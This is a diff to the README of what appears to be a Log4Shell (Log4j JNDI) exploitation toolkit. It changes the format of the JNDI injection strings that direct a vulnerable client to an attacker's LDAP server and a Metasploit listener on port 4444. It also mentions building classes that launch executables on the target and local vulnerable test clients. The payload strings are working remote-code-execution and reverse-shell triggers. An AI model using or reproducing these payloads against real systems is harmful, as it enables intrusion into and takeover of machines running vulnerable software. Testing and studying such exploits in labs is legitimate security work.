@@ -22,7 +22,7 @@ run: python3 run_servers.py <your_ip_address> <the_http_port> [ldap_port]
 Then pass the jndi string to a vulnerable client to log i.e:
 if your host was 10.20.30.40 and your metasploit instance was 20.30.40.50 
 listening on port 4444 it would look like this : 
-'${jndi:ldap://10.20.30.40:1389/#MM_20_30_40_50_4444}'
+'${jndi:ldap://10.20.30.40:1389/#MM:20.30.40.50:4444}'
 
 #### Building executable commands
 You can build classes that will launch executable on the source system.
@@ -57,7 +57,7 @@ navigate to the clients dir and run  ./build_clients.sh
 from the clients dir run : java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jWebServer [Port_number]
 
 #### To execute the cmd line : 
-from the clients dir run : java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jCmdLine '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}'
+from the clients dir run : java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jCmdLine '${jndi:ldap://127.0.0.1:1389/#MM:127.0.0.1:4444}'
 
 
 
